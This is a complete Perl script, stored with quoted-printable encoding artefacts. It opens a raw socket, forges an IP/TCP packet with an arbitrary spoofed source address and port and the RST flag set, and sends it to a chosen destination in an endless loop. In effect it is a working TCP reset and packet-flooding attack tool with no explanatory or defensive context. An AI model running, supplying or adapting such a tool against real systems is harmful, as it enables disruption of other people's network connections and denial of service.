#!/usr/local/bin/perl

use Socket;

$src_host =3D $ARGV[0];=20
$src_port =3D $ARGV[1];=20
$dst_host =3D $ARGV[2];=20
$dst_port =3D $ARGV[3];=20

if(!defined $src_host or !defined $src_port or !defined $dst_host or !defin=
ed $dst_port)=20
{
=09
=09print "Usage: $0 <source host> <source port> <dest host> <dest port>\n";
=09exit;
}=20
else=20
{
=09
=09main();
}
=20
sub main=20
{
=09my $src_host =3D (gethostbyname($src_host))[4];
=09my $dst_host =3D (gethostbyname($dst_host))[4];
=09$IPROTO_RAW =3D 255;
=09socket($sock , AF_INET, SOCK_RAW, $IPROTO_RAW)=20
=09=09or die $!;
=09my ($packet) =3D makeheaders($src_host, $src_port, $dst_host, $dst_port)=
;
=09my ($destination) =3D pack('Sna4x8', AF_INET, $dst_port, $dst_host);
=09while(1)
=09{
=09=09send($sock , $packet , 0 , $destination)
=09=09=09or die $!;
=09}
}

sub makeheaders=20
{
=09$IPPROTO_TCP =3D 6;
=09local($src_host , $src_port , $dst_host , $dst_port) =3D @_;
=09my $zero_cksum =3D 0;
=09my $tcp_len =3D 20;
=09my $seq =3D 19456;
=09my $seq_ack =3D 0;
=09my $tcp_doff =3D "5";
=09my $tcp_res =3D 0;
=09my $tcp_doff_res =3D $tcp_doff . $tcp_res;
=09my $tcp_urg =3D 0;=20
=09my $tcp_ack =3D 0;
=09my $tcp_psh =3D 0;
=09my $tcp_rst =3D 1;
=09my $tcp_syn =3D 0;
=09my $tcp_fin =3D 0;
=09my $null =3D 0;
=09my $tcp_win =3D 124;
=09my $tcp_urg_ptr =3D 44;
=09my $tcp_flags =3D $null . $null . $tcp_urg . $tcp_ack . $tcp_psh . $tcp_=
rst . $tcp_syn . $tcp_fin ;
=09my $tcp_check =3D 0;
=09my $tcp_header =3D pack('nnNNH2B8nvn' , $src_port , $dst_port , $seq, $s=
eq_ack , $tcp_doff_res, $tcp_flags,  $tcp_win , $tcp_check, $tcp_urg_ptr);
=09my $tcp_pseudo =3D pack('a4a4CCn' , $src_host, $dst_host, 0, $IPPROTO_TC=
P, length($tcp_header) ) . $tcp_header;
=09$tcp_check =3D &checksum($tcp_pseudo);
=09my $tcp_header =3D pack('nnNNH2B8nvn' , $src_port , $dst_port , $seq, $s=
eq_ack , $tcp_doff_res, $tcp_flags,  $tcp_win , $tcp_check, $tcp_urg_ptr);
=09my $ip_ver =3D 4;
=09my $ip_len =3D 5;
=09my $ip_ver_len =3D $ip_ver . $ip_len;
=09my $ip_tos =3D 00;
=09my $ip_tot_len =3D $tcp_len + 20;
=09my $ip_frag_id =3D 19245;
=09my $ip_ttl =3D 25;
=09my $ip_proto =3D $IPPROTO_TCP;=09
=09my $ip_frag_flag =3D "010";
=09my $ip_frag_oset =3D "0000000000000";
=09my $ip_fl_fr =3D $ip_frag_flag . $ip_frag_oset;
=09my $ip_header =3D pack('H2CnnB16CCna4a4',=09$ip_ver_len, $ip_tos, $ip_to=
t_len, $ip_frag_id,=09$ip_fl_fr , $ip_ttl , $ip_proto , $zero_cksum , $src_=
host , $dst_host);
=09my $pkt =3D $ip_header . $tcp_header;
=09return $pkt;
}
sub checksum=20
{
=09my ($msg) =3D @_;
=09my ($len_msg,$num_short,$short,$chk);
=09$len_msg =3D length($msg);
=09$num_short =3D $len_msg / 2;
=09$chk =3D 0;
=09
=09foreach $short (unpack("S$num_short", $msg))=20
=09{
=09=09$chk +=3D $short;
=09}
=09
=09$chk +=3D unpack("C", substr($msg, $len_msg - 1, 1)) if $len_msg % 2;
=09$chk =3D ($chk >> 16) + ($chk & 0xffff);
=09
=09return(~(($chk >> 16) + $chk) & 0xffff);
}=20